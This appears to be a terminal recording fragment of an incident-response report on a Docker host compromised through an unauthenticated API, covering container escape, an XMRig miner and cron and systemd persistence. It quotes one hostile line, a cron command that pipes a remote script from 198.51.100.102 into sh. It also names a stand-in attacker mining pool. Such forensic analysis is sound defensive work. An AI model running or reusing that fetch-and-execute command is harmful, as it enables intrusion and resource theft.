[238.263829, "o", "## 3. Detailed Attack Chain & Technical Analysis\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r"]
[238.263988, "o", "\u001b[?2004h> "]
[238.264025, "o", "### Step 1: Initial Access & External Remote Services (MITRE ATT&CK T1133)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[238.264124, "o", "The Docker Engine API on host `docker-prod-01` was bound to `0.0.0.0:2375` without TLS or authentication (`/disk/etc/docker/daemon.json:116`, `/sas/baseline.json:1`). This allowed unauthenticated remote access to manage containers directly over TCP.\r\n\u001b[?2004l\r"]
[238.264226, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
[238.264683, "o", "### Step 2: Container Deployment (MITRE ATT&CK T1610)\r\n\u001b[?2004l\r"]
[238.264733, "o", "\u001b[?2004h> "]
[238.265006, "o", "The attacker connected to port 2375 and deployed a container using an overridden entrypoint script (`/disk/var/lib/docker/overlay2/attacker/diff/entrypoint.sh:3`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h"]
[238.265083, "o", "> ### Step 3: Container Escape (MITRE ATT&CK T1611)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[238.265525, "o", "By starting a privileged container with the host volume mounted (`/` mounted inside the container), the attacker executed commands on the underlying host, effectively escaping container isolation (`/disk/var/lib/docker/overlay2/attacker/diff/entrypoint.sh:3`, `/disk/var/lib/.cache/.wiped.bin:1`).\r\n\u001b[?2004l\r\u001b[?2004h> \r\n"]
[238.265627, "o", "\u001b[?2004l\r\u001b[?2004h> ### Step 4: Execution & Resource Hijacking (MITRE ATT&CK T1496)\r\n\u001b[?2004l\r"]
[238.265683, "o", "\u001b[?2004h> "]
[238.265995, "o", "The attacker dropped and executed an XMRig cryptominer at `/opt/xmrig/xmrig` (`/disk/opt/xmrig/xmrig:3`). The process runs under PID 1337 and connects to pool `stratum+tcp://xmr.docker.evil:3333` (`/disk/opt/xmrig/xmrig:4`).\r\n\u001b[?2004l\r\u001b[?2004h"]
[238.266071, "o", "> \r\n\u001b[?2004l\r\u001b[?2004h> ### Step 5: Cron Persistence (MITRE ATT&CK T1053.003)\r\n\u001b[?2004l\r"]
[238.266119, "o", "\u001b[?2004h> "]
[238.266401, "o", "The attacker created `/etc/cron.d/docker-mon` (`/disk/etc/cron.d/docker-mon:5`) to periodically fetch and re-drop miner payloads via `curl http://198.51.100.102/x | sh`.\r\n\u001b[?2004l\r\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h"]
[238.26645, "o", "> "]
[238.266561, "o", "### Step 6: Systemd Persistence — SILENT (MITRE ATT&CK T1543.002)"]
[238.266628, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> "]
[238.266923, "o", "The attacker installed a systemd unit file at `/etc/systemd/system/docker-metrics.service` (`/disk/etc/systemd/system/docker-metrics.service:5`). Disguised under the service name `System Update Helper`, it executes a re-dropper script upon boot/service restart.\r\n\u001b[?2004l\r\u001b[?2004h> "]
[238.266966, "o", "\r\n\u001b[?2004l\r\u001b[?2004h> "]
[238.266993, "o", "### Step 7: Anti-Forensics & Wiping Residue (MITRE ATT&CK T1070)\r\n\u001b[?2004l\r\u001b[?2004h> "]
[238.26713, "o", "Evidence of log wiping and C2 communication was found in `/var/lib/.cache/.wiped.bin` (`/disk/var/lib/.cache/.wiped.bin:1`).\r\n\u001b[?2004l\r"]
[238.26721, "o", "\u001b[?2004h> \r\n\u001b[?2004l\r\u001b[?2004h> "]
